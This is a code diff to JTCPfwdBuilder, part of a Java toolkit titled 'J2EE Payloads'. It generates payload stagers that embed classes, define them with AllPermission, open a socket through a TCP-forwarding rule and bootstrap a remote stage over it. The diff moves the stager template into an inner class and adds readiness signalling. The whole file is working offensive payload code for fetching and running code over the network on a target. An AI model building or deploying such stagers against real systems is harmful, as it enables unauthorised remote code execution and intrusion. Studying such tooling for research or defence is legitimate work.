@@ -1,7 +1,7 @@
 /*
  * J2EE Payloads.
  * 
- * Copyright (c) 2010, Michael 'mihi' Schierl
+ * Copyright (c) 2010, 2011 Michael 'mihi' Schierl
  * All rights reserved.
  * 
  * Redistribution and use in source and binary forms, with or without
@@ -56,7 +56,7 @@ import java.util.jar.JarOutputStream;
 import java.util.jar.Manifest;
 import java.util.zip.ZipEntry;
 
-import javapayload.handler.stage.StageHandler;
+import javapayload.builder.Builder;
 import javapayload.stage.StreamForwarder;
 import javapayload.stager.Stager;
 import jtcpfwd.CustomLiteBuilder;
@@ -73,13 +73,27 @@ import org.objectweb.asm.MethodAdapter;
 import org.objectweb.asm.MethodVisitor;
 import org.objectweb.asm.Opcodes;
 
-public class JTCPfwdBuilder extends Stager {
+public class JTCPfwdBuilder extends Builder {
+	
+	// TODO make this a DynStager?
 	
 	public static void main(String[] args) throws Exception {
 		if (args.length != 2 || args[0].length() != 1 || "FL".indexOf(args[0]) == -1) {
 			System.out.println("Usage: java j2eepayload.builder.JTCPfwdBuilder F|L <rule>");
 			return;
 		}
+		new JTCPfwdBuilder().build(args);
+	}
+	
+	public JTCPfwdBuilder() {
+		super("Build a stager for a JTCPfwd rule.", "");
+	}
+	
+	public String getParameterSyntax() {
+		return "F|L <rule>";
+	}
+	
+	public void build(String[] args) throws Exception {		
 		boolean listener = args[0].equals("L");
 		Module mainModule = Lookup.lookupClass(listener ? Listener.class : Forwarder.class, args[1]);
 		HashSet /*<String>*/ classNameSet = new HashSet();
@@ -92,7 +106,7 @@ public class JTCPfwdBuilder extends Stager {
 		DataOutputStream dos = new DataOutputStream(classesOut);
 		for (int i = 0; i < classNames.size(); i++) {
 			Class clazz = Class.forName((String)classNames.get(i));
-			final InputStream classStream = StageHandler.class.getResourceAsStream("/" + clazz.getName().replace('.', '/') + ".class");
+			final InputStream classStream = JTCPfwdBuilder.class.getResourceAsStream("/" + clazz.getName().replace('.', '/') + ".class");
 			final ByteArrayOutputStream baos = new ByteArrayOutputStream();
 			StreamForwarder.forward(classStream, baos);
 			final byte[] classBytes = baos.toByteArray();
@@ -117,7 +131,7 @@ public class JTCPfwdBuilder extends Stager {
 			}
 
 			private String cleanType(String type) {
-				if (type.equals("j2eepayload/builder/JTCPfwdBuilder")) {
+				if (type.equals("j2eepayload/builder/JTCPfwdBuilder$StagerTemplate")) {
 					type = newClassName;
 				}
 				return type;
@@ -155,7 +169,7 @@ public class JTCPfwdBuilder extends Stager {
 		System.out.println("Finished encoding embed data");
 		final ClassVisitor integratorVisitor = new ClassAdapter(cw) {
 			public void visit(int version, int access, String name, String signature, String superName, String[] interfaces) {
-				if (!superName.equals("javapayload/stager/Stager") || !name.equals(JTCPfwdBuilder.class.getName().replace('.', '/')))
+				if (!superName.equals("javapayload/stager/Stager") || !name.equals(StagerTemplate.class.getName().replace('.', '/')))
 					throw new RuntimeException("Incompatible input class");
 				super.visit(version, access, classname, signature, superName, interfaces);
 			}
@@ -165,7 +179,7 @@ public class JTCPfwdBuilder extends Stager {
 			}
 
 			public MethodVisitor visitMethod(int access, String name, String desc, String signature, String[] exceptions) {
-				if (name.equals("bootstrap") || name.equals("<init>") || name.equals("findClass")) {
+				if (name.equals("bootstrap") || name.equals("<init>") || name.equals("findClass") || name.equals("waitReady")) {
 					return new MyMethodVisitor(super.visitMethod(access, name, desc, signature, exceptions), classname);
 				} else if (name.equals("getEmbeddedClasses")) {
 					MethodVisitor mv = super.visitMethod(access, name, desc, signature, exceptions);
@@ -189,7 +203,7 @@ public class JTCPfwdBuilder extends Stager {
 				// do not copy outer classes
 			}
 		};
-		final InputStream is = JTCPfwdBuilder.class.getResourceAsStream("/" + JTCPfwdBuilder.class.getName().replace('.', '/') + ".class");
+		final InputStream is = StagerTemplate.class.getResourceAsStream("/" + StagerTemplate.class.getName().replace('.', '/') + ".class");
 		final ClassReader cr = new ClassReader(is);
 		cr.accept(integratorVisitor, 0);
 		is.close();
@@ -217,14 +231,17 @@ public class JTCPfwdBuilder extends Stager {
 		return utflen;
 	}
 	
+	public static class StagerTemplate extends Stager {
+		
 	private String getEmbeddedClasses() {
 		return "TO_BE_REPLACED";
 	}
 	
 	private Map /*<String,byte[]>*/ classCache;
 	private ProtectionDomain pd;
+	private boolean ready;
 	
-	public void bootstrap(String[] parameters) throws Exception {
+	public void bootstrap(String[] parameters, boolean needWait) throws Exception {
 		final DataInputStream in = new DataInputStream(new ByteArrayInputStream(getEmbeddedClasses().getBytes("ISO-8859-1")));
 		final Permissions permissions = new Permissions();
 		permissions.add(new AllPermission());
@@ -241,7 +258,12 @@ public class JTCPfwdBuilder extends Stager {
 		} while (length > 0);
 		Class clazz = findClass(className);
 		resolveClass(clazz);
-		final Socket s = (Socket) clazz.getMethod("getSocket", new Class[] {Class.forName("java.lang.String")}).invoke(null, new String[] {parameters[1]});
+		Object module = clazz.getMethod("getModule", new Class[] {Class.forName("java.lang.String")}).invoke(null, new String[] {parameters[1]});
+		synchronized(this) {
+			ready = true;
+			notifyAll();
+		}
+		final Socket s = (Socket) clazz.getMethod("getSocket", new Class[] {Class.forName("java.lang.Object")}).invoke(null, new Object[] {module});
 		bootstrap(s.getInputStream(), s.getOutputStream(), parameters);
 	}
 	
@@ -250,5 +272,11 @@ public class JTCPfwdBuilder extends Stager {
 		if (classfile == null)
 			return super.findClass(name);
 		return defineClass(null, classfile, 0, classfile.length, pd);
+	}
+	
+	public synchronized void waitReady() throws InterruptedException {
+		while (!ready)
+			wait();
+	}
 	}
 }
